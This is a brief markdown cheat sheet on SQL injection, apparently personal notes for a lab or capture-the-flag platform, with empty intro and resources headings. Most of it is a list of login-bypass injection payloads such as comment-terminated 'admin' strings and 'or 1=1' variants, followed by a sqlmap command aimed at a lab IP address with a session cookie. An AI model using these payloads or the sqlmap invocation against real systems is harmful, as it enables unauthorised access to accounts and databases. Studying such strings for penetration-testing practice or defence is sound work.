---
  title: "SQL Injection"
---

# Intro
# Examples
-admin' --
-admin' #
-admin'/*
-' or 1=1--
-' or 1=1#
-' or 1=1/*
-') or '1'='1--
-') or ('1'='1--
-') or ('1'='1--

# SQLMap
`sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=tovt65ca3b7jv8q0fsts6lkbap"`
# Resources
